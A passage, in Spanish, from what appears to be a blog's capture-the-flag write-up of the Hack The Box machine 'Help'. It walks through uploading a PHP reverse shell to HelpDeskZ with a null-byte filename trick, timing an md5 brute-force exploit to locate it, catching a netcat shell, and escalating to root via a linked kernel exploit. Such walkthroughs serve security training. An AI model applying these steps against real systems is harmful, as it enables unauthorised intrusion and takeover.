vulnerabilidad, dicho exploit se le pasa la url de la plataforma y el nombre de la shell que subimos, con estos parametros el exploit generar un hash md5 con el nombre del archivo y la hora actual.\nExploit: https://www.exploit-db.com/exploits/40300\nLa razon por la cual el exploit genera un hash md5 es porque la plataforma al subir un archivo genera un hash md5 con el nombre del archivo y la hora actual, para luego renombrar el archivo con el hash y guardarlo en /uploads/tickets/.\n1  $filename = md5($_FILES[\u0026#39;attachment\u0026#39;][\u0026#39;name\u0026#39;].time()).\u0026#34;.\u0026#34;.$ext;   Tambien que tomar en cuenta que los archivos que se agregan al ticket se guardan en el directorio /uploads/tickets/.\nCodigo de pagina de tickets:\nhttps://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/view_tickets_controller.php\nUtilizamos una reverse shell para poder ejecutar comandos dentro de la plataforma para ello vamos renombrar nuestra reverse shell con caracteres null al final del archivo.\nConfiguracion Reverse shell:\nYa que tenemos nuestra reverse shell debemos de tomar en cuenta que al ejecutar el exploit debemos de tener la misma hora del servidor en el que esta la plataforma. Obtuvimos la \u0026ldquo;hora del servidor\u0026rdquo; mediante la respuesta de un request en burpsuite, para luego utilizar esta \u0026ldquo;hora o timezone\u0026rdquo; en nuestra maquina.\nHelpDeskZ - TICKET Para crear un ticket nos dirigimos hacia Submit Ticket, seleccionamos General y Siguiete.\nLuego de esto rellenamos los campos que sean obligatorios (*), agregamos nuestro archivo (shell.php%00.jpg) y escribimos el captcha que nos muestra.\nEXPLOIT Cuando el archivo es subido ejecutamos nuestro exploit. Hay que mencionar que al exploit se le hicieron unos cambios, uno de ellos fue agregar un valor mas alto al rango y verbosidad.\n1  python exploit.py http://10.10.10.121/support/uploads/tickets/ shell.php   Al encontrar nuestra reverse shell el exploit se congela y nos muestra la url.\nNETCAT Por otro lado nuestra terminal en escucha con netcat obtuvo una shell.\nY nuestra flag user.txt.\nPRIVILEGE ESCALATION Para escalar privilegios hicimos una pequeña enumeracion, entre ellas el kernel, encontramos que el kernel que esta usando la maquina es vulnerable a un exploit.\nExploit: https://www.exploit-db.com/exploits/44298\nCompilamos y descargamos el exploit dentro de lamaquina, al ejecutarlo nos devuelve una shell con privilegios root.\nY nuestra flag root.txt.\n","description":"","id":99,"section":"posts","tags":["linux"],"title":"Hack The Box - Help","uri":"https://sckull.github.io/posts/help/"}]